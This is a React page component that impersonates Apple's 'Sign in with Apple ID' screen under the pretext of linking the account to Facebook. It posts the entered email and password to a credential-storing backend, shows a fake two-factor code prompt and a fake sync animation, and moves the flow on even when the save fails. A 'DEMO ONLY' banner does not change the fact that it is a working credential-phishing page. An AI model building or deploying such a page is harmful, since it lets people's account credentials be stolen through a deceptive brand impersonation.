import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { insertCredentialSchema, type InsertCredential } from "@shared/schema";
import { useCreateCredential } from "@/hooks/use-credentials";
import { FaApple, FaFacebook, FaCheck, FaLock, FaExclamationTriangle } from "react-icons/fa";
import { motion, AnimatePresence } from "framer-motion";
import { AppleLoader } from "@/components/AppleLoader";
import { Button } from "@/components/ui/button";

// Step Enum
type Step = "login" | "two_factor" | "syncing" | "facebook_auth" | "success";

export default function Home() {
  const [step, setStep] = useState<Step>("login");
  const [verificationCode, setVerificationCode] = useState(["", "", "", "", "", ""]);
  const { mutateAsync: createCredential } = useCreateCredential();
  
  // Form Setup
  const form = useForm<InsertCredential>({
    resolver: zodResolver(insertCredentialSchema),
    defaultValues: {
      email: "",
      password: "",
      service: "icloud",
    },
  });

  // Handlers
  const handleLoginSubmit = async (data: InsertCredential) => {
    try {
      console.log("Submitting login:", data);
      // Send credentials (simulation)
      await createCredential({ ...data, service: "icloud" });
      console.log("Credential created successfully");
      setStep("two_factor");
    } catch (error) {
      console.error("Submission error", error);
      // Ensure the flow continues even if the API call fails
      setStep("two_factor");
    }
  };

  const handleVerificationSubmit = () => {
    setStep("syncing");
    
    // Move to next step after a delay
    setTimeout(() => {
      console.log("Moving to facebook_auth step");
      setStep("facebook_auth");
    }, 4000);
  };

  const handleCodeChange = (index: number, value: string) => {
    if (value.length > 1) return;
    
    const newCode = [...verificationCode];
    newCode[index] = value;
    setVerificationCode(newCode);

    // Auto-focus next input
    if (value !== "" && index < 5) {
      const nextInput = document.getElementById(`code-${index + 1}`);
      nextInput?.focus();
    }

    // Check if all filled
    if (newCode.every(digit => digit !== "")) {
      setTimeout(handleVerificationSubmit, 500);
    }
  };

  const handleFacebookConfirm = async () => {
    // Fake loading then success
    setStep("success");
  };

  return (
    <div className="min-h-screen w-full flex flex-col items-center justify-center bg-[#f5f5f7] p-4 font-sans text-[#1d1d1f]">
      
      {/* DISCLAIMER BANNER - Crucial for safety/ethics */}
      <div className="fixed top-0 left-0 right-0 bg-yellow-100 border-b border-yellow-200 p-2 text-center text-xs font-semibold text-yellow-800 flex items-center justify-center gap-2 z-50">
        <FaExclamationTriangle />
        <span>DEMO ONLY. DO NOT ENTER REAL CREDENTIALS.</span>
      </div>

      <AnimatePresence mode="wait">
        
        {/* STEP 1: ICLOUD LOGIN */}
        {step === "login" && (
          <motion.div
            key="login"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            transition={{ duration: 0.4 }}
            className="w-full max-w-[400px] flex flex-col items-center"
          >
            <div className="mb-8 flex flex-col items-center">
              <FaApple className="text-5xl text-[#1d1d1f] mb-4" />
              <h1 className="text-2xl font-semibold tracking-tight text-center">
                Sign in with Apple ID
              </h1>
              <p className="text-[17px] text-[#86868b] mt-2 text-center leading-snug max-w-[280px]">
                Verify your identity to enable Facebook synchronization.
              </p>
            </div>

            <div className="w-full bg-white rounded-2xl shadow-sm border border-[#d2d2d7] p-8">
              <form onSubmit={form.handleSubmit(handleLoginSubmit)} className="space-y-4">
                <div className="space-y-4">
                  <div>
                    <input
                      {...form.register("email")}
                      className="apple-input"
                      placeholder="Email or Phone Number"
                      type="text"
                      autoComplete="username"
                    />
                    {form.formState.errors.email && (
                      <p className="text-red-500 text-xs mt-1 ml-1">
                        {form.formState.errors.email.message}
                      </p>
                    )}
                  </div>
                  
                  <div>
                    <input
                      {...form.register("password")}
                      className="apple-input"
                      placeholder="Password"
                      type="password"
                      autoComplete="current-password"
                    />
                    {form.formState.errors.password && (
                      <p className="text-red-500 text-xs mt-1 ml-1">
                        {form.formState.errors.password.message}
                      </p>
                    )}
                  </div>
                </div>

                <div className="pt-4 flex flex-col gap-4">
                  <div className="flex items-center justify-center gap-2 text-[#86868b] text-xs">
                    <FaLock className="w-3 h-3" />
                    <span>Your Apple ID information is used to sign in securely.</span>
                  </div>
                  
                  <button 
                    type="submit" 
                    className="apple-btn flex items-center justify-center gap-2"
                    disabled={form.formState.isSubmitting}
                  >
                     {form.formState.isSubmitting ? <AppleLoader /> : "Sign In"}
                  </button>
                </div>
              </form>
            </div>
            
            <div className="mt-8 text-sm text-[#0071e3] cursor-pointer hover:underline">
              Create Apple ID
            </div>
          </motion.div>
        )}

        {/* STEP 2: TWO FACTOR AUTH */}
        {step === "two_factor" && (
          <motion.div
            key="two_factor"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-[400px] flex flex-col items-center"
          >
            <div className="mb-8 flex flex-col items-center">
              <FaApple className="text-5xl text-[#1d1d1f] mb-4" />
              <h1 className="text-2xl font-semibold tracking-tight text-center">
                Two-Factor Authentication
              </h1>
              <p className="text-[17px] text-[#86868b] mt-2 text-center leading-snug">
                A message with a verification code has been sent to your devices. Enter the code to continue.
              </p>
            </div>

            <div className="w-full bg-white rounded-2xl shadow-sm border border-[#d2d2d7] p-8">
              <div className="flex justify-between gap-2">
                {verificationCode.map((digit, idx) => (
                  <input
                    key={idx}
                    id={`code-${idx}`}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleCodeChange(idx, e.target.value)}
                    className="w-10 h-14 text-center text-2xl font-semibold border border-[#d2d2d7] rounded-lg focus:border-[#0071e3] focus:ring-1 focus:ring-[#0071e3] outline-none transition-all"
                  />
                ))}
              </div>
              
              <div className="mt-8 text-center">
                <button 
                  onClick={() => setVerificationCode(["", "", "", "", "", ""])}
                  className="text-sm text-[#0071e3] hover:underline"
                >
                  Didn't get a verification code?
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {/* STEP 2: SYNCING ANIMATION */}
        {step === "syncing" && (
          <motion.div
            key="syncing"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-lg flex flex-col items-center justify-center"
          >
            <div className="relative h-32 w-full flex items-center justify-center mb-8">
              {/* Apple Icon */}
              <motion.div
                initial={{ x: -100, opacity: 0 }}
                animate={{ x: -60, opacity: 1 }}
                transition={{ duration: 0.8, type: "spring" }}
                className="absolute"
              >
                <div className="w-20 h-20 bg-white rounded-2xl shadow-md flex items-center justify-center z-10 relative border border-gray-100">
                  <FaApple className="text-4xl text-black" />
                </div>
              </motion.div>

              {/* Connecting Line */}
              <div className="absolute w-[120px] h-[2px] bg-gray-200 overflow-hidden rounded-full">
                <motion.div
                  className="h-full bg-[#0071e3]"
                  initial={{ x: "-100%" }}
                  animate={{ x: "100%" }}
                  transition={{ 
                    duration: 1.5, 
                    repeat: Infinity, 
                    ease: "linear" 
                  }}
                />
              </div>

              {/* Facebook Icon */}
              <motion.div
                initial={{ x: 100, opacity: 0 }}
                animate={{ x: 60, opacity: 1 }}
                transition={{ duration: 0.8, type: "spring", delay: 0.2 }}
                className="absolute"
              >
                <div className="w-20 h-20 bg-[#1877F2] rounded-2xl shadow-md flex items-center justify-center z-10 relative">
                  <FaFacebook className="text-4xl text-white" />
                </div>
              </motion.div>
            </div>

            <motion.h2 
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className="text-xl font-medium text-[#1d1d1f] mb-2"
            >
              Syncing Accounts...
            </motion.h2>
            
            <motion.p 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.5 }}
              className="text-[#86868b]"
            >
              Verifying credentials and establishing secure connection.
            </motion.p>
          </motion.div>
        )}

        {/* STEP 3: FACEBOOK AUTH CONFIRMATION */}
        {step === "facebook_auth" && (
          <motion.div
            key="facebook"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-[400px] flex flex-col items-center"
          >
             <div className="w-full bg-white rounded-2xl shadow-sm border border-[#d2d2d7] p-8 text-center">
                <div className="mx-auto w-16 h-16 bg-[#1877F2] rounded-full flex items-center justify-center mb-6 shadow-lg shadow-blue-500/20">
                  <FaFacebook className="text-3xl text-white" />
                </div>
                
                <h2 className="text-2xl font-bold text-[#1d1d1f] mb-2">Confirm Identity</h2>
                <p className="text-[#86868b] mb-8 leading-relaxed">
                  Please confirm that you want to link your Apple ID with your Facebook account.
                </p>

                <div className="space-y-3">
                  <button 
                    onClick={handleFacebookConfirm}
                    className="facebook-btn flex items-center justify-center gap-2"
                  >
                    Continue with Facebook
                  </button>
                  <button 
                    onClick={() => setStep("login")}
                    className="w-full py-3 text-[#0071e3] text-sm font-medium hover:underline"
                  >
                    Cancel
                  </button>
                </div>
             </div>
          </motion.div>
        )}

        {/* STEP 4: SUCCESS */}
        {step === "success" && (
          <motion.div
            key="success"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-md flex flex-col items-center text-center p-8"
          >
            <motion.div
              initial={{ scale: 0 }}
              animate={{ scale: 1 }}
              transition={{ type: "spring", stiffness: 200, damping: 15 }}
              className="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center mb-6 shadow-xl shadow-green-500/30"
            >
              <FaCheck className="text-4xl text-white" />
            </motion.div>
            
            <h1 className="text-3xl font-bold text-[#1d1d1f] mb-4">Identity Verified</h1>
            <p className="text-[#86868b] text-lg max-w-sm">
              Your Apple ID has been successfully verified and synced with Facebook. You can now close this window.
            </p>
            
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.5 }}
              className="mt-12 p-4 bg-white rounded-xl border border-gray-200 flex items-center gap-4 shadow-sm w-full"
            >
              <div className="flex -space-x-2">
                 <div className="w-8 h-8 rounded-full bg-black flex items-center justify-center ring-2 ring-white">
                    <FaApple className="text-white text-xs" />
                 </div>
                 <div className="w-8 h-8 rounded-full bg-[#1877F2] flex items-center justify-center ring-2 ring-white">
                    <FaFacebook className="text-white text-xs" />
                 </div>
              </div>
              <div className="text-left">
                <div className="text-sm font-medium text-green-600">Active Connection</div>
                <div className="text-xs text-gray-500">Last synced just now</div>
              </div>
            </motion.div>
          </motion.div>
        )}

      </AnimatePresence>

      <div className="fixed bottom-4 text-[10px] text-gray-400">
        Copyright © 2024 Demo Inc. All rights reserved. Privacy Policy
      </div>
    </div>
  );
}
